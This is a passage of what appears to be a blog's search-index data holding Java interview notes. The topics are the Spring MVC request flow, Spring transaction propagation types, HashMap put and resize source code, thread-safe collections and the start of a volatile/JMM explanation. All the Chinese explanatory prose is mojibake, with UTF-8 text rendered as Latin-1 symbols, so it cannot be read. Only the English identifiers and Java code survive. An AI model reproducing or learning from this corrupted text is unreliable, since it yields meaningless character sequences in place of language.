ä¸Šè¿°çš„ä¸¤ç§æ–¹å¼ï¼Œæœ€ç»ˆéƒ½ä¼šè¢« Spring MVC è½¬æ¢ä¸ºä¸€ä¸ª ModelAndView å¯¹è±¡ Spring MVC å·¥ä½œåŸç†å›¾ Spring MVC å·¥ä½œæµç¨‹Spring MVC å„ç»„ä»¶ DispatcherServletï¼šä¸­å¤®æ§åˆ¶å™¨ï¼Œä¹Ÿç§°ä¸ºå‰ç«¯æ§åˆ¶å™¨ï¼Œå®ƒæ˜¯æ•´ä¸ªè¯·æ±‚å“åº”çš„æ§åˆ¶ä¸­å¿ƒï¼Œç»„ä»¶çš„è°ƒç”¨ç”±å®ƒç»Ÿä¸€è°ƒåº¦ HandlerMappingï¼šå¤„ç†å™¨æ˜ å°„å™¨ï¼Œå®ƒæ ¹æ®ç”¨æˆ·è®¿é—®çš„ URL æ˜ å°„åˆ°å¯¹åº”çš„åç«¯å¤„ç†å™¨ Handlerã€‚ä¹Ÿå°±æ˜¯è¯´å®ƒçŸ¥é“å¤„ç†ç”¨æˆ·è¯·æ±‚çš„åç«¯å¤„ç†å™¨ï¼Œä½†æ˜¯å®ƒå¹¶ä¸æ‰§è¡Œåç«¯å¤„ç†å™¨ï¼Œè€Œæ˜¯å°†åç«¯å¤„ç†å™¨å‘Šè¯‰ç»™ä¸­å¤®å¤„ç†å™¨ HandlerAdapterï¼šå¤„ç†å™¨é€‚é…å™¨ï¼Œå®ƒè°ƒç”¨åç«¯å¤„ç†å™¨ä¸­çš„æ–¹æ³•ï¼Œè¿”å›é€»è¾‘è§†å›¾ ModelAndView å¯¹è±¡ ViewResolverï¼šè§†å›¾è§£æå™¨ï¼Œå°† ModelAndView é€»è¾‘è§†å›¾è§£æä¸ºå…·ä½“çš„è§†å›¾ï¼ˆå¦‚ JSPï¼‰ Handlerï¼šåç«¯å¤„ç†å™¨ï¼Œå¯¹ç”¨æˆ·å…·ä½“è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œä¹Ÿå°±æ˜¯ Controller ç±» Spring MVC çš„å·¥ä½œæµç¨‹ï¼š 1ï¼‰ç”¨æˆ·å‘æœåŠ¡ç«¯å‘é€ä¸€æ¬¡è¯·æ±‚ï¼Œè¿™ä¸ªè¯·æ±‚ä¼šå…ˆåˆ°ä¸­å¤®æ§åˆ¶å™¨ DispatcherServletï¼ˆå‰ç«¯æ§åˆ¶å™¨ï¼‰ 2ï¼‰DispatcherServlet æ¥æ”¶åˆ°è¯·æ±‚åä¼šè°ƒç”¨ HandlerMapping å¤„ç†å™¨æ˜ å°„å™¨ã€‚ç”±æ­¤å¾—çŸ¥ï¼Œè¯¥è¯·æ±‚è¯¥ç”±å“ªä¸ª Controller æ¥å¤„ç†ï¼ˆæ­¤æ—¶å¹¶æœªè°ƒç”¨ Controllerï¼Œåªæ˜¯å¾—çŸ¥ï¼‰ 3ï¼‰DispatcherServlet è°ƒç”¨ HandlerAdapter å¤„ç†å™¨é€‚é…å™¨ï¼Œå‘Šè¯‰å¤„ç†å™¨é€‚é…å™¨åº”è¯¥è¦å»æ‰§è¡Œå“ªä¸ª Controller 4ï¼‰HandlerAdapter å¤„ç†å™¨é€‚é…å™¨å»æ‰§è¡Œ Controller å¹¶å¾—åˆ° ModelAndView ï¼ˆæ•°æ®å’Œè§†å›¾ï¼‰ï¼Œå¹¶å±‚å±‚è¿”å›ç»™ DispatcherServlet 5ï¼‰DispatcherServlet å°† ModelAndView äº¤ç»™ ViewReslover è§†å›¾è§£æå™¨è§£æï¼Œç„¶åè¿”å›çœŸæ­£çš„è§†å›¾ 6ï¼‰DispatcherServlet å°†æ¨¡å‹æ•°æ®å¡«å……åˆ°è§†å›¾ä¸­ 7ï¼‰DispatcherServlet å°†ç»“æœå“åº”ç»™ç”¨æˆ· Spring æ•°æ®åº“äº‹åŠ¡Spring çš„ä¸ƒç§äº‹åŠ¡ä¼ æ’­è¡Œä¸ºå½“äº‹åŠ¡æ–¹æ³•è¢«å¦ä¸€ä¸ªäº‹åŠ¡æ–¹æ³•è°ƒç”¨æ—¶ï¼Œå¿…é¡»æŒ‡å®šäº‹åŠ¡åº”è¯¥å¦‚ä½•ä¼ æ’­ã€‚ä¾‹å¦‚ï¼šæ–¹æ³•å¯èƒ½åœ¨ç°æœ‰çš„äº‹åŠ¡ä¸­è¿è¡Œï¼Œä¹Ÿå¯èƒ½å¼€å¯ä¸€ä¸ªæ–°çš„äº‹åŠ¡ï¼Œå¹¶åœ¨è‡ªå·±çš„äº‹åŠ¡ä¸­è¿è¡Œã€‚Spring å®šä¹‰äº†ä¸ƒç§äº‹åŠ¡ä¼ æ’­è¡Œä¸ºï¼Œé»˜è®¤çš„äº‹åŠ¡ä¼ æ’­è¡Œä¸ºæ˜¯ PROPAGATION_REQUIREDã€‚ ä¼ æ’­è¡Œä¸º è¯´æ˜ PROPAGATION_REQUIRED å¦‚æœå­˜åœ¨ä¸€ä¸ªäº‹åŠ¡ï¼Œåˆ™æ”¯æŒå½“å‰äº‹åŠ¡ï¼›å¦‚æœæ²¡æœ‰äº‹åŠ¡åˆ™å¼€å¯ PROPAGATION_SUPPORTS å¦‚æœå­˜åœ¨ä¸€ä¸ªäº‹åŠ¡ï¼Œæ”¯æŒå½“å‰äº‹åŠ¡ï¼›å¦‚æœæ²¡æœ‰äº‹åŠ¡ï¼Œåˆ™éäº‹åŠ¡çš„æ‰§è¡Œ PROPAGATION_MANDATORY å¦‚æœå·²ç»å­˜åœ¨ä¸€ä¸ªäº‹åŠ¡ï¼Œæ”¯æŒå½“å‰äº‹åŠ¡ï¼›å¦‚æœæ²¡æœ‰ä¸€ä¸ªæ´»åŠ¨çš„äº‹åŠ¡ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ PROPAGATION_REQUIRES_NEW æ€»æ˜¯å¼€å¯ä¸€ä¸ªæ–°çš„äº‹åŠ¡ï¼›å¦‚æœä¸€ä¸ªäº‹åŠ¡å·²ç»å­˜åœ¨ï¼Œåˆ™å°†è¿™ä¸ªå­˜åœ¨çš„äº‹åŠ¡æŒ‚èµ· PROPAGATION_NOT_SUPPORTED æ€»æ˜¯éäº‹åŠ¡åœ°æ‰§è¡Œï¼Œå¹¶æŒ‚èµ·ä»»ä½•å­˜åœ¨çš„äº‹åŠ¡ PROPAGATION_NEVER æ€»æ˜¯éäº‹åŠ¡åœ°æ‰§è¡Œï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªæ´»åŠ¨äº‹åŠ¡ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ PROPAGATION_NESTED å¦‚æœæœ‰ä¸€ä¸ªæ´»åŠ¨çš„äº‹åŠ¡å­˜åœ¨ï¼Œåˆ™è¿è¡Œåœ¨ä¸€ä¸ªåµŒå¥—çš„äº‹åŠ¡ä¸­ï¼›å¦‚æœæ²¡æœ‰æ´»åŠ¨äº‹åŠ¡ï¼Œåˆ™æŒ‰ PROPAGATION_REQUIRED æ‰§è¡Œ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"Java é›†åˆç±»é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/cc846db2.html",text:'é›†åˆç±»åŸºç¡€å¸¸è§çš„é›†åˆç±»æœ‰å“ªäº›Map æ¥å£å’Œ Collection æ¥å£æ˜¯æ‰€æœ‰é›†åˆæ¡†æ¶çš„çˆ¶æ¥å£ï¼Œå…¶ä¸­ Collection æ¥å£çš„å­æ¥å£åŒ…æ‹¬ Set æ¥å£å’Œ List æ¥å£ï¼š Set æ¥å£çš„å®ç°ç±»ä¸»è¦æœ‰ï¼šHashSetã€TreeSetã€LinkedHashSet ç­‰ List æ¥å£çš„å®ç°ç±»ä¸»è¦æœ‰ï¼šArrayListã€LinkedListã€Stackã€Vector ç­‰ Map æ¥å£çš„å®ç°ç±»ä¸»è¦æœ‰ï¼šHashMapã€TreeMapã€HashTableã€ConcurrentHashMap ä»¥åŠ Properties ç­‰ HashMap ä¸ HashTable çš„åŒºåˆ« HashMap å…è®¸ K/V éƒ½ä¸º Nullï¼ŒHashtable è§„å®š K/V éƒ½ä¸å…è®¸ä¸º Null HashMap ç»§æ‰¿è‡ª AbstractMap ç±»ï¼Œè€Œ HashTable ç»§æ‰¿è‡ª Dictionary ç±» HashMap æ²¡æœ‰è€ƒè™‘åŒæ­¥ï¼Œæ˜¯çº¿ç¨‹ä¸å®‰å…¨çš„ï¼›Hashtable ä½¿ç”¨äº† synchronized å…³é”®å­—ï¼Œæ˜¯çº¿ç¨‹å®‰å…¨çš„ é›†åˆç±»æºç åˆ†æHashMap çš„ Put æ–¹æ³•çš„å…·ä½“æµç¨‹ â˜…å±•å¼€æºä»£ç â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) { HashMap.Node&lt;K, V&gt;[] tab; HashMap.Node&lt;K, V&gt; p; int n, i; // 1.å¦‚æœtableä¸ºç©ºæˆ–è€…é•¿åº¦ä¸º0ï¼Œå³æ²¡æœ‰å…ƒç´ ï¼Œé‚£ä¹ˆä½¿ç”¨resize()æ–¹æ³•æ‰©å®¹ if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; // 2.è®¡ç®—æ’å…¥å­˜å‚¨çš„æ•°ç»„ç´¢å¼•iï¼Œæ­¤å¤„è®¡ç®—æ–¹æ³•åŒ 1.7 ä¸­çš„indexFor()æ–¹æ³• // å¦‚æœæ•°ç»„ä¸ºç©ºï¼Œå³ä¸å­˜åœ¨Hashå†²çªï¼Œåˆ™ç›´æ¥æ’å…¥æ•°ç»„ if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); // 3.æ’å…¥æ—¶ï¼Œå¦‚æœå‘ç”ŸHashå†²çªï¼Œåˆ™ä¾æ¬¡å¾€ä¸‹åˆ¤æ–­ else { HashMap.Node&lt;K, V&gt; e; K k; // a.åˆ¤æ–­table[i]çš„å…ƒç´ çš„keyæ˜¯å¦ä¸éœ€è¦æ’å…¥çš„keyä¸€æ ·ï¼Œè‹¥ç›¸åŒåˆ™ç›´æ¥ç”¨æ–°çš„valueè¦†ç›–æ‰æ—§çš„value // åˆ¤æ–­åŸåˆ™equals() - æ‰€ä»¥éœ€è¦å½“keyçš„å¯¹è±¡é‡å†™è¯¥æ–¹æ³• if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; // b.ç»§ç»­åˆ¤æ–­ï¼šéœ€è¦æ’å…¥çš„æ•°æ®ç»“æ„æ˜¯çº¢é»‘æ ‘è¿˜æ˜¯é“¾è¡¨ // å¦‚æœæ˜¯çº¢é»‘æ ‘ï¼Œåˆ™ç›´æ¥åœ¨æ ‘ä¸­æ’å…¥ or æ›´æ–°é”®å€¼å¯¹ else if (p instanceof HashMap.TreeNode) e = ((HashMap.TreeNode&lt;K, V&gt;) p).putTreeVal(this, tab, hash, key, value); // å¦‚æœæ˜¯é“¾è¡¨ï¼Œåˆ™åœ¨é“¾è¡¨ä¸­æ’å…¥ or æ›´æ–°é”®å€¼å¯¹ else { // i .éå†table[i]ï¼Œåˆ¤æ–­keyæ˜¯å¦å·²å­˜åœ¨ï¼šé‡‡ç”¨equalså¯¹æ¯”å½“å‰éå†ç»“ç‚¹çš„keyä¸éœ€è¦æ’å…¥æ•°æ®çš„key // å¦‚æœå­˜åœ¨ç›¸åŒçš„ï¼Œåˆ™ç›´æ¥è¦†ç›– // ii.éå†å®Œæ¯•åä»»åŠ¡å‘ç°ä¸Šè¿°æƒ…å†µï¼Œåˆ™ç›´æ¥åœ¨é“¾è¡¨å°¾éƒ¨æ’å…¥æ•°æ® // æ’å…¥å®Œæˆååˆ¤æ–­é“¾è¡¨é•¿åº¦æ˜¯å¦ &gt; 8ï¼šè‹¥æ˜¯ï¼Œåˆ™æŠŠé“¾è¡¨è½¬æ¢æˆçº¢é»‘æ ‘ for (int binCount = 0; ; ++binCount) { if ((e = p.next) == null) { p.next = newNode(hash, key, value, null); if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; } if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; } } // å¯¹äºi æƒ…å†µçš„åç»­æ“ä½œï¼šå‘ç°keyå·²å­˜åœ¨ï¼Œç›´æ¥ç”¨æ–°valueè¦†ç›–æ—§value&amp;è¿”å›æ—§value if (e != null) { // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); return oldValue; } } ++modCount; // æ’å…¥æˆåŠŸåï¼Œåˆ¤æ–­å®é™…å­˜åœ¨çš„é”®å€¼å¯¹æ•°é‡size &gt; æœ€å¤§å®¹é‡ // å¦‚æœå¤§äºåˆ™è¿›è¡Œæ‰©å®¹ if (++size &gt; threshold) resize(); // æ’å…¥æˆåŠŸæ—¶ä¼šè°ƒç”¨çš„æ–¹æ³•ï¼ˆé»˜è®¤å®ç°ä¸ºç©ºï¼‰ afterNodeInsertion(evict); return null;} HashMap çš„æ‰©å®¹æ“ä½œå¦‚ä½•å®ç°çš„ â˜…å±•å¼€æºä»£ç â˜… 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283/** * è¯¥æ–¹æ³•æœ‰ä¸¤ç§ä½¿ç”¨æƒ…å†µï¼š1.åˆå§‹åŒ–å“ˆå¸Œè¡¨ï¼›2.å½“å‰æ•°ç»„å®¹é‡è¿‡å°ï¼Œéœ€è¦æ‰©å®¹ */final Node&lt;K, V&gt;[] resize() { Node&lt;K, V&gt;[] oldTab = table;// æ‰©å®¹å‰çš„æ•°ç»„ï¼ˆå½“å‰æ•°ç»„ï¼‰ int oldCap = (oldTab == null) ? 0 : oldTab.length;// æ‰©å®¹å‰çš„æ•°ç»„å®¹é‡ï¼ˆæ•°ç»„é•¿åº¦ï¼‰ int oldThr = threshold;// æ‰©å®¹å‰æ•°ç»„çš„é˜ˆå€¼ int newCap, newThr = 0; if (oldCap &gt; 0) { // é’ˆå¯¹æƒ…å†µ2ï¼šè‹¥æ‰©å®¹å‰çš„æ•°ç»„å®¹é‡è¶…è¿‡æœ€å¤§å€¼ï¼Œåˆ™ä¸å†æ‰©å®¹ if (oldCap &gt;= MAXIMUM_CAPACITY) { threshold = Integer.MAX_VALUE; return oldTab; } // é’ˆå¯¹æƒ…å†µ2ï¼šè‹¥æ²¡æœ‰è¶…è¿‡æœ€å¤§å€¼ï¼Œå°±æ‰©å®¹ä¸ºåŸæ¥çš„2å€ï¼ˆå·¦ç§»1ä½ï¼‰ else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp; oldCap &gt;= DEFAULT_INITIAL_CAPACITY) newThr = oldThr &lt;&lt; 1; // double threshold } // é’ˆå¯¹æƒ…å†µ1ï¼šåˆå§‹åŒ–å“ˆå¸Œè¡¨ï¼ˆé‡‡ç”¨æŒ‡å®šæˆ–è€…ä½¿ç”¨é»˜è®¤å€¼çš„æ–¹å¼ï¼‰ else if (oldThr &gt; 0) // initial capacity was placed in threshold newCap = oldThr; else { // zero initial threshold signifies using defaults newCap = DEFAULT_INITIAL_CAPACITY; newThr = (int) (DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY); } // è®¡ç®—æ–°çš„resizeä¸Šé™ if (newThr == 0) { float ft = (float) newCap * loadFactor; newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float) MAXIMUM_CAPACITY ? (int) ft : Integer.MAX_VALUE); } threshold = newThr; @SuppressWarnings({"rawtypes", "unchecked"}) Node&lt;K, V&gt;[] newTab = (Node&lt;K, V&gt;[]) new Node[newCap]; table = newTab; if (oldTab != null) { // æŠŠæ¯ä¸€ä¸ªbucketéƒ½ç§»åŠ¨åˆ°æ–°çš„bucketä¸­å» for (int j = 0; j &lt; oldCap; ++j) { Node&lt;K, V&gt; e; if ((e = oldTab[j]) != null) { oldTab[j] = null; if (e.next == null) newTab[e.hash &amp; (newCap - 1)] = e; else if (e instanceof TreeNode) ((TreeNode&lt;K, V&gt;) e).split(this, newTab, j, oldCap); else { // preserve order Node&lt;K, V&gt; loHead = null, loTail = null; Node&lt;K, V&gt; hiHead = null, hiTail = null; Node&lt;K, V&gt; next; do { next = e.next; if ((e.hash &amp; oldCap) == 0) { if (loTail == null) loHead = e; else loTail.next = e; loTail = e; } else { if (hiTail == null) hiHead = e; else hiTail.next = e; hiTail = e; } } while ((e = next) != null); if (loTail != null) { loTail.next = null; newTab[j] = loHead; } if (hiTail != null) { hiTail.next = null; newTab[j + oldCap] = hiHead; } } } } } return newTab;} é›†åˆç±»çš„çº¿ç¨‹å®‰å…¨æ€§é›†åˆç±»çš„éçº¿ç¨‹å®‰å…¨é—®é¢˜é—®é¢˜ï¼šæ™®é€šçš„é›†åˆç±»æ˜¯éçº¿ç¨‹å®‰å…¨çš„ï¼Œè¯·ç¼–å†™ä¸€ä¸ªçº¿ç¨‹ä¸å®‰å…¨çš„ä½¿ç”¨æ¡ˆä¾‹å¹¶ç»™å‡ºè§£å†³æ–¹æ¡ˆ â˜…å±•å¼€æ¡ˆä¾‹ä»£ç â˜… 12345678910111213public class ArrayListUnSafe { public static void main(String[] args) { List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 10; i++) { new Thread(() -&gt; { list.add(UUID.randomUUID().toString().substring(0, 8)); System.out.println(list); }).start(); } }} 1è¿è¡Œç»“æœå¯èƒ½ä¼šæŠ›å‡º java.util.ConcurrentModificationException å¼‚å¸¸ å›ç­”ï¼š ç¬¬ä¸€æ–¹æ³•ï¼šä½¿ç”¨ Vector æ›¿ä»£ ArrayListï¼Œå³ List&lt;String&gt; list = new Vector&lt;&gt;(); ç¬¬äºŒç§æ–¹æ³•ï¼šä½¿ç”¨ Collectons ç±»ï¼Œå³ List&lt;String&gt; list = Collections.synchronizedList(new ArrayList()); ç¬¬ä¸‰ç§æ–¹æ³•ï¼šä½¿ç”¨ CopyOnWriteArrayList ç±»ï¼Œå³ List&lt;String&gt; list = new CopyOnWriteArrayList&lt;&gt;(); é›†åˆç±»çš„å†™æ—¶å¤åˆ¶ï¼ˆCopyOnWriteï¼‰å†™æ—¶å¤åˆ¶ï¼ˆCopyOnWriteï¼‰ä»‹ç»CopyOnWrite å®¹å™¨å³å†™æ—¶å¤åˆ¶çš„å®¹å™¨ã€‚å¾€ä¸€ä¸ªå®¹å™¨æ·»åŠ å…ƒç´ çš„æ—¶å€™ï¼Œä¸ç›´æ¥å¾€å½“å‰å®¹å™¨çš„ Object[] æ·»åŠ ï¼Œè€Œæ˜¯å…ˆå°†å½“å‰ Object[] è¿›è¡Œ Copyï¼Œå¤åˆ¶å‡ºä¸€ä¸ªæ–°çš„å®¹å™¨ Object[] newElementsï¼Œç„¶åæ–°çš„å®¹å™¨ Object[] newElements é‡Œæ·»åŠ å…ƒç´ ï¼Œæ·»åŠ å®Œå…ƒç´ ä¹‹åï¼Œå†å°†åŸå®¹å™¨çš„å¼•ç”¨æŒ‡å‘æ–°çš„å®¹å™¨ï¼ˆsetArrayï¼ˆnewElementsï¼‰ï¼‰ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯å¯ä»¥å¯¹ CopyOnWrite å®¹å™¨è¿›è¡Œå¹¶å‘çš„è¯»ï¼Œè€Œä¸éœ€è¦åŠ é”ï¼Œå› ä¸ºå½“å‰å®¹å™¨ä¸ä¼šæ·»åŠ ä»»ä½•å…ƒç´ ã€‚æ‰€ä»¥ CopyOnWrite å®¹å™¨ä¹Ÿæ˜¯ä¸€ç§è¯»å†™åˆ†ç¦»çš„æ€æƒ³ï¼Œè¯»å’Œå†™çš„æ˜¯ä¸åŒçš„å®¹å™¨ã€‚JDK 8 çš„ CopyOnWriteArrayList çš„æºç å¦‚ä¸‹ï¼š å†™æ—¶å¤åˆ¶ï¼ˆCopyOnWriteï¼‰ä¼˜ç¼ºç‚¹åº”ç”¨åœºæ™¯ï¼šåº”ç”¨äºè¯»å¤šå†™å°‘çš„å¹¶å‘åœºæ™¯ä½¿ç”¨æ³¨æ„ï¼šä¸ºäº†å‡å°‘æ‰©å®¹å¼€é”€ï¼Œå°½é‡ä½¿ç”¨æ‰¹é‡æ·»åŠ ï¼ˆå‡å°‘å¤åˆ¶æ¬¡æ•°ï¼‰ç¼ºç‚¹ï¼šå­˜åœ¨å†…å­˜å ç”¨é—®é¢˜ã€æ•°æ®ä¸€è‡´æ€§é—®é¢˜ï¼ˆCopyOnWrite æœºåˆ¶åªèƒ½ä¿è¯æœ€ç»ˆçš„æ•°æ®ä¸€è‡´ï¼Œä¸èƒ½ä¿è¯å®æ—¶æ•°æ®çš„å¼ºä¸€è‡´æ€§ï¼Œå› æ­¤å¦‚æœå¸Œæœ›å†™å…¥çš„æ•°æ®èƒ½é©¬ä¸Šèƒ½è¯»åˆ°ï¼Œæ­¤æ—¶å°±ä¸åº”è¯¥ä½¿ç”¨ CopyOnWriteï¼‰ çº¿ç¨‹å®‰å…¨çš„é›†åˆç±»æ€»ç»“ CopyOnWriteArrayListï¼šCopyOnWriteArrayList ä¸­çš„ addã€setã€remove ç­‰æ–¹æ³•ï¼Œéƒ½æ˜¯ç”¨äº† ReentrantLock çš„ lock() æ¥åŠ é”ï¼Œunlock() æ¥è§£é”ã€‚å½“å¢åŠ å…ƒç´ æ—¶ä½¿ç”¨ Array.copyOf() æ¥æ‹·è´å‰¯æœ¬ï¼Œåœ¨å‰¯æœ¬ä¸Šå¢åŠ å…ƒç´ ï¼Œç„¶åæ”¹å˜åŸå¼•ç”¨æŒ‡å‘å‰¯æœ¬ï¼Œè¯»æ“ä½œä¸åŠ é”ï¼Œé€‚åˆè¯»æ“ä½œè¿œè¿œå¤šäºå†™æ“ä½œçš„åº”ç”¨ã€‚ CopyOnWriteArraySetï¼šCopyOnWriteArraySet æ˜¯åœ¨ CopyOnWriteArrayList çš„åŸºç¡€ä¸Šä½¿ç”¨äº† Java çš„è£…é¥°æ¨¡å¼ï¼Œåº•å±‚è¿˜æ˜¯ä½¿ç”¨ CopyOnWriteArrayList æ¥å®ç°ã€‚List å’Œ Set çš„åŒºåˆ«åŒæ ·é€‚ç”¨äº CopyOnWriteArrayList å’Œ CopyOnWriteArraySetã€‚ ConcurrentHashMapï¼šConcurrentHashMap æ˜¯ HashMap çš„çº¿ç¨‹å®‰å…¨ç‰ˆï¼ˆä½†æ­¤ç±»ä¸å…è®¸ Null åšé”®æˆ–è€…å€¼ï¼‰ï¼ŒåŒ HashTable ç›¸æ¯”ï¼ŒConcurrentHashMap ä¸ä»…ä¿è¯äº†è®¿é—®çš„çº¿ç¨‹å®‰å…¨æ€§ï¼Œè€Œä¸”åœ¨æ•ˆç‡ä¸Šä¸ HashTable ç›¸æ¯”æœ‰è¾ƒå¤§çš„æé«˜ã€‚ConcurrentHashMap å…è®¸å¤šä¸ªä¿®æ”¹æ“ä½œå¹¶å‘è¿›è¡Œï¼Œåº•å±‚ä½¿ç”¨äº†é”åˆ†ç¦»çš„æŠ€æœ¯ï¼Œå³ä»£ç å—é”ï¼Œè€Œä¸æ˜¯æ–¹æ³•é”ã€‚å…¶ä¸­ä½¿ç”¨äº†å¤šä¸ªé”æ¥æ§åˆ¶å¯¹ HashTable çš„ä¸åŒéƒ¨åˆ†è¿›è¡Œçš„ä¿®æ”¹ã€‚ConcurrentHashMap å†…éƒ¨ä½¿ç”¨æ®µï¼ˆSegmentï¼‰æ¥è¡¨ç¤ºä¸åŒçš„éƒ¨åˆ†ï¼Œæ¯ä¸ªæ®µå…¶å®å°±æ˜¯ä¸€ä¸ªå°çš„ HashTableï¼Œå®ƒä»¬æœ‰è‡ªå·±çš„é”ï¼ˆä½¿ç”¨ ReentrantLock æ¥å®ç°ï¼‰ã€‚åªè¦å¤šä¸ªä¿®æ”¹å‘ç”Ÿåœ¨ä¸åŒçš„æ®µä¸Šï¼Œå®ƒä»¬å°±å¯ä»¥å¹¶å‘è¿›è¡Œã€‚ æ€»ç»“ï¼š HashMap æ˜¯éçº¿ç¨‹å®‰å…¨çš„ï¼ŒHashTable æ˜¯çº¿ç¨‹å®‰å…¨çš„ LinkedListã€ArrayListã€HashSet æ˜¯éçº¿ç¨‹å®‰å…¨çš„ï¼ŒVector æ˜¯çº¿ç¨‹å®‰å…¨çš„ ConcurrentHashMapã€CopyOnWriteArrayListã€CopyOnWriteArraySet æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œè¿™å‡ ä¸ªéƒ½æ˜¯ java.util.concurrent åŒ…æä¾›çš„å¹¶å‘çº¿ç¨‹å®‰å…¨çš„é›†åˆç±» var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"Java å¤šçº¿ç¨‹é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/1f270e10.html",text:'è°ˆè°ˆå¯¹ Volatile çš„ç†è§£Volatile çš„ç‰¹æ€§Volatile æ˜¯ Java è™šæ‹Ÿæœºæä¾›çš„è½»é‡çº§çš„åŒæ­¥æœºåˆ¶ï¼Œå…·æœ‰ä»¥ä¸‹ä¸‰å¤§ç‰¹æ€§ï¼š ä¿è¯å¯è§æ€§ ä¸ä¿è¯åŸå­æ€§ ç¦æ­¢æŒ‡ä»¤é‡æ’ Java å†…å­˜æ¨¡å‹JMMï¼ˆJava å†…å­˜æ¨¡å‹ï¼Œç®€ç§° JMMï¼‰æœ¬èº«æ˜¯ä¸€ç§æŠ½è±¡çš„æ¦‚å¿µå¹¶ä¸çœŸå®å­˜åœ¨ï¼Œå®ƒæè¿°çš„æ˜¯ä¸€ç»„è§„åˆ™æˆ–è§„èŒƒï¼Œé€šè¿‡è¿™ç»„è§„èŒƒå®šä¹‰äº†ç¨‹åºä¸­å„ä¸ªå˜é‡ï¼ˆåŒ…æ‹¬å®ä¾‹å­—æ®µã€é™æ€å­—æ®µå’Œæ„æˆæ•°ç»„å¯¹è±¡çš„å…ƒç´ ï¼‰çš„è®¿é—®æ–¹å¼ï¼Œå³å±è”½æ‰ Java ç¨‹åºåœ¨å„ç§ä¸åŒçš„ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿå¯¹å†…å­˜çš„è®¿é—®çš„å·®å¼‚ï¼Œè¿™æ ·å°±å¯ä»¥å®ç° Java ç¨‹åºåœ¨å„ç§ä¸åŒçš„å¹³å°ä¸Šéƒ½èƒ½è¾¾åˆ°å†…å­˜è®¿é—®çš„ä¸€è‡´æ€§ã€‚ JMM å…³äºåŒæ­¥çš„è§„å®šå¦‚ä¸‹ï¼š 1ï¼‰çº¿ç¨‹è§£é”å‰ï¼Œå¿…é¡»æŠŠå…±äº«å˜é‡çš„å€¼åˆ·æ–°å›ä¸»å†…å­˜ 2ï¼‰çº¿ç¨‹åŠ é”å‰ï¼Œå¿…é¡»è¯»å–ä¸»å†…å­˜çš„æœ€æ–°å€¼åˆ°è‡ªå·±çš„å·¥ä½œå†…å­˜ 3ï¼‰åŠ é”è§£é”æ˜¯åŒä¸€æŠŠé” ç”±äº JVM è¿è¡Œç¨‹åºçš„å®ä½“æ˜¯çº¿ç¨‹ï¼Œè€Œæ¯ä¸ªçº¿ç¨‹åˆ›å»ºæ—¶ JVM éƒ½ä¼šä¸ºå…¶åˆ›å»ºä¸€ä¸ªå·¥ä½œå†…å­˜ï¼ˆæœ‰äº›åœ°æ–¹ç§°ä¸ºæ ˆç©ºé—´ï¼‰ï¼Œå·¥ä½œå†…å­˜æ˜¯æ¯ä¸ªçº¿ç¨‹çš„ç§æœ‰æ•°æ®åŒºåŸŸï¼Œè€Œåœ¨ Java 